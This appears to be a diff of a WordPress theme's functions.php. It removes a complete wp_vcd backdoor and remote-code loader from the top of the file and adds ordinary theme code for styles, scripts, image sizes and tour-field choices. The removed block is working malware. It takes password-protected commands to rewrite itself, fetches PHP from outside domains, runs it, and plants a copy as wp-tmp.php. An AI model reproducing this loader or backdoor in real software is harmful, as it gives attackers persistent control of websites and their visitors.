@@ -1,228 +1,52 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b139276c660a1fc1fd3e81cdf0e63442'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='38fe324f1e4c10f398ec3de5ba615271';
-        if (($tmpcontent = @file_get_contents("http://www.wrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.wrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /**
- * tcftheme functions and definitions
- *
- * @link https://developer.wordpress.org/themes/basics/theme-functions/
- *
- * @package tcftheme
- */
+* tcftheme functions and definitions
+*
+* @link https://developer.wordpress.org/themes/basics/theme-functions/
+*
+* @package tcftheme
+*/
+
+add_image_size( 'tour-thumb', 370, 250, true );
+add_image_size( 'recent-post-thumb', 350, 230, true );
+add_image_size( 'profile-thumb', 270, 310, true );
+remove_image_size('1536x1536');
+remove_image_size('2048x2048');
 
 if ( ! function_exists( 'tcftheme_setup' ) ) :
 	/**
-	 * Sets up theme defaults and registers support for various WordPress features.
-	 *
-	 * Note that this function is hooked into the after_setup_theme hook, which
-	 * runs before the init hook. The init hook is too late for some features, such
-	 * as indicating support for post thumbnails.
-	 */
+	* Sets up theme defaults and registers support for various WordPress features.
+	*
+	* Note that this function is hooked into the after_setup_theme hook, which
+	* runs before the init hook. The init hook is too late for some features, such
+	* as indicating support for post thumbnails.
+	*/
 	function tcftheme_setup() {
+
 		/*
-		 * Make theme available for translation.
-		 * Translations can be filed in the /languages/ directory.
-		 * If you're building a theme based on tcftheme, use a find and replace
-		 * to change 'tcftheme' to the name of your theme in all the template files.
-		 */
+		* Make theme available for translation.
+		* Translations can be filed in the /languages/ directory.
+		* If you're building a theme based on tcftheme, use a find and replace
+		* to change 'tcftheme' to the name of your theme in all the template files.
+		*/
 		load_theme_textdomain( 'tcftheme', get_template_directory() . '/languages' );
 
 		// Add default posts and comments RSS feed links to head.
 		add_theme_support( 'automatic-feed-links' );
 
 		/*
-		 * Let WordPress manage the document title.
-		 * By adding theme support, we declare that this theme does not use a
-		 * hard-coded <title> tag in the document head, and expect WordPress to
-		 * provide it for us.
-		 */
+		* Let WordPress manage the document title.
+		* By adding theme support, we declare that this theme does not use a
+		* hard-coded <title> tag in the document head, and expect WordPress to
+		* provide it for us.
+		*/
 		add_theme_support( 'title-tag' );
 
 		/*
-		 * Enable support for Post Thumbnails on posts and pages.
-		 *
-		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
-		 */
+		* Enable support for Post Thumbnails on posts and pages.
+		*
+		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
+		*/
 		add_theme_support( 'post-thumbnails' );
 
 		// This theme uses wp_nav_menu() in one location.
@@ -231,9 +55,9 @@ if ( ! function_exists( 'tcftheme_setup' ) ) :
 		) );
 
 		/*
-		 * Switch default core markup for search form, comment form, and comments
-		 * to output valid HTML5.
-		 */
+		* Switch default core markup for search form, comment form, and comments
+		* to output valid HTML5.
+		*/
 		add_theme_support( 'html5', array(
 			'search-form',
 			'comment-form',
@@ -252,10 +76,10 @@ if ( ! function_exists( 'tcftheme_setup' ) ) :
 		add_theme_support( 'customize-selective-refresh-widgets' );
 
 		/**
-		 * Add support for core custom logo.
-		 *
-		 * @link https://codex.wordpress.org/Theme_Logo
-		 */
+		* Add support for core custom logo.
+		*
+		* @link https://codex.wordpress.org/Theme_Logo
+		*/
 		add_theme_support( 'custom-logo', array(
 			'height'      => 250,
 			'width'       => 250,
@@ -267,12 +91,12 @@ endif;
 add_action( 'after_setup_theme', 'tcftheme_setup' );
 
 /**
- * Set the content width in pixels, based on the theme's design and stylesheet.
- *
- * Priority 0 to make it available to lower priority callbacks.
- *
- * @global int $content_width
- */
+* Set the content width in pixels, based on the theme's design and stylesheet.
+*
+* Priority 0 to make it available to lower priority callbacks.
+*
+* @global int $content_width
+*/
 function tcftheme_content_width() {
 	// This variable is intended to be overruled from themes.
 	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
@@ -282,10 +106,10 @@ function tcftheme_content_width() {
 add_action( 'after_setup_theme', 'tcftheme_content_width', 0 );
 
 /**
- * Register widget area.
- *
- * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
- */
+* Register widget area.
+*
+* @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
+*/
 function tcftheme_widgets_init() {
 	register_sidebar( array(
 		'name'          => esc_html__( 'Sidebar', 'tcftheme' ),
@@ -300,57 +124,121 @@ function tcftheme_widgets_init() {
 add_action( 'widgets_init', 'tcftheme_widgets_init' );
 
 /**
- * Enqueue scripts and styles.
- */
+* Enqueue scripts and styles.
+*/
 function tcftheme_scripts() {
-	wp_enqueue_style( 'tcftheme-style', get_stylesheet_uri() );
 
-	wp_enqueue_script( 'tcftheme-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
+	wp_deregister_script('jquery');
 
-	wp_enqueue_script( 'tcftheme-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
+	// wp_enqueue_style( 'tcftheme-style', get_stylesheet_uri() );
+
+	wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/fonts/css/all.css' );
+	wp_enqueue_style('google-fonts', 'https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700', []);
+	
+	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css', []);
+
+	wp_enqueue_style('nice-select', get_template_directory_uri() . '/assets/css/nice-select.css');
+
+	// wp_enqueue_style('core', get_template_directory_uri() . '/assets/css/core.css');
+
+	wp_enqueue_style('shortcode-default', get_template_directory_uri() . '/assets/css/shortcode/default.css');
+	wp_enqueue_style('shortcode-header', get_template_directory_uri() . '/assets/css/shortcode/header.css');
+	wp_enqueue_style('shortcode-footer', get_template_directory_uri() . '/assets/css/shortcode/footer.css');
+	wp_enqueue_style('shortcode-slider', get_template_directory_uri() . '/assets/css/shortcode/slider.css');
+
+	wp_enqueue_style('color', get_template_directory_uri() . '/assets/css/plugins/color.css');
+	wp_enqueue_style('responsive', get_template_directory_uri() . '/assets/css/responsive.css');
+	
+	wp_enqueue_style('slick', get_template_directory_uri() . '/assets/css/plugins/slick.css');
+	wp_enqueue_style('slick-theme', get_template_directory_uri() . '/assets/css/plugins/slick-theme.css');
+
+	wp_enqueue_style( 'date-picker', get_template_directory_uri() . '/assets/lib/date-picker/datepicker.css', []);
+
+	wp_enqueue_style('blog', get_template_directory_uri() . '/assets/blog.css');
+	wp_enqueue_style('sidebar', get_template_directory_uri() . '/assets/css/sidebar.css');
+	
+	wp_enqueue_style('style', get_template_directory_uri() . '/assets/style.css');
+	wp_enqueue_style('custom', get_template_directory_uri() . '/assets/css/custom.css');
+	
+	wp_enqueue_script( 'jquery', get_template_directory_uri() . '/assets/js/vendor/jquery-3.3.1.min.js', []);
+	wp_enqueue_script( 'jquery-patch', get_template_directory_uri() . '/assets/js/jquery-patch.js', ['jquery']);
+
+	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/assets/js/vendor/modernizr-2.8.3.min.js', [''], false);
+
+	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', [], false, true);
+	wp_enqueue_script( 'popper', get_template_directory_uri() . '/assets/js/popper.js', [], false, true);
+
+	wp_enqueue_script( 'date-picker', get_template_directory_uri() . '/assets/lib/date-picker/datepicker.js', ['jquery'], true);
+	// wp_enqueue_script( 'jssor-slider', get_template_directory_uri() . '/assets/js/jssor.slider-28.0.0.min.js', ['jquery'], true);
+	// wp_enqueue_script( 'mailchimp', get_template_directory_uri() . '/assets/js/jquery.ajaxchimp.min.js', ['jquery'], false, true);
+	// wp_enqueue_script( 'ajax-mail', get_template_directory_uri() . '/assets/js/ajax-mail.js', ['jquery'], false, true);
+	// wp_enqueue_script( 'waypoints', get_template_directory_uri() . '/assets/js/waypoints.min.js', ['jquery'], false, true);
+	// wp_enqueue_script( 'video-player', get_template_directory_uri() . '/assets/js/jquery.mb.YTPlayer.js', ['jquery'], false, true);
+	wp_enqueue_script( 'nice-select', get_template_directory_uri() . '/assets/js/jquery.nice-select.min.js', [], false, true);
+	wp_enqueue_script( 'slick', get_template_directory_uri() . '/assets/js/slick.js', ['jquery'], false, true);
+
+	wp_enqueue_script( 'plugins', get_template_directory_uri() . '/assets/js/plugins.js', ['jquery'], false, true);
+
+	
+	// wp_enqueue_script( 'tcftheme-navigation', get_template_directory_uri() . '/js/navigation.js', ['jquery'], false, true );
+	// wp_enqueue_script( 'tcftheme-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', ['jquery'], false, true );
 
 	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
 		wp_enqueue_script( 'comment-reply' );
 	}
+
+	wp_enqueue_script( 'main', get_template_directory_uri() . '/assets/js/main.js', ['jquery'], false, true);
+	wp_enqueue_script( 'custom', get_template_directory_uri() . '/assets/js/custom.js', ['jquery'], false, true);
+
+	/*
+
+	<script src="<?php bloginfo('stylesheet_directory'); ?>/assets/js/owl.carousel.min.js"></script>
+
+	<!-- nivo slider js
+	========================================================= -->
+	<script src="<?php bloginfo('stylesheet_directory'); ?>/assets/lib/nivo-slider/js/jquery.nivo.slider.js"></script>
+	<script src="<?php bloginfo('stylesheet_directory'); ?>/assets/lib/nivo-slider/home.js"></script>
+
+	*/
 }
 add_action( 'wp_enqueue_scripts', 'tcftheme_scripts' );
 
 /**
- * Implement the Custom Header feature.
- */
+* Implement the Custom Header feature.
+*/
 require get_template_directory() . '/inc/custom-header.php';
 
 /**
- * Custom template tags for this theme.
- */
+* Custom template tags for this theme.
+*/
 require get_template_directory() . '/inc/template-tags.php';
 
 /**
- * Functions which enhance the theme by hooking into WordPress.
- */
+* Functions which enhance the theme by hooking into WordPress.
+*/
 require get_template_directory() . '/inc/template-functions.php';
 
 /**
- * Customizer additions.
- */
+* Customizer additions.
+*/
 require get_template_directory() . '/inc/customizer.php';
 
 /**
- * Load Jetpack compatibility file.
- */
+* Load Jetpack compatibility file.
+*/
 if ( defined( 'JETPACK__VERSION' ) ) {
 	require get_template_directory() . '/inc/jetpack.php';
 }
 
 if( function_exists('acf_add_options_page') ) {
 
-    acf_add_options_page();
+	acf_add_options_page();
 
 }
 
 function new_excerpt_more($more) {
-    global $post;
-    return '...';
+	global $post;
+	return '...';
 }
 add_filter('excerpt_more', 'new_excerpt_more');
 
@@ -358,15 +246,49 @@ add_filter('excerpt_more', 'new_excerpt_more');
 
 function myTruncate($string, $limit, $break=".", $pad="...")
 {
-    // return with no change if string is shorter than $limit
-    if(strlen($string) <= $limit) return $string;
+	// return with no change if string is shorter than $limit
+	if(strlen($string) <= $limit) return $string;
 
-    // is $break present between $limit and the end of the string?
-    if(false !== ($breakpoint = strpos($string, $break, $limit))) {
-        if($breakpoint < strlen($string) - 1) {
-            $string = substr($string, 0, $breakpoint) . $pad;
-        }
-    }
+	// is $break present between $limit and the end of the string?
+	if(false !== ($breakpoint = strpos($string, $break, $limit))) {
+		if($breakpoint < strlen($string) - 1) {
+			$string = substr($string, 0, $breakpoint) . $pad;
+		}
+	}
 
-    return $string;
+	return $string;
+}
+
+
+
+
+
+function load_popular_tours_field_choices( $field ) {
+	// Get the names of all tours
+	$choices = array();
+	$args = array(
+		'post_type'			=> 'tour',
+		'posts_per_page'	=> -1
+	);
+	$loop = new WP_Query( $args );
+	if ($loop->have_posts()) {
+		while ($loop->have_posts()) {
+			$loop->the_post();
+			array_push($choices, get_the_title());
+		}
+	}
+
+	// Load the names of the tours into the select field
+	$field['sub_fields'][0]['choices'] = $choices;
+    return $field;
+}
+add_filter('acf/load_field/name=popular_tours', 'load_popular_tours_field_choices');
+
+
+function load_include($file, $args = []){
+    $filename = 'template-parts/' . $file . '.php';
+    extract($args);
+    global $post;   
+    
+    return include(  locate_template( $filename ) ); 
 }
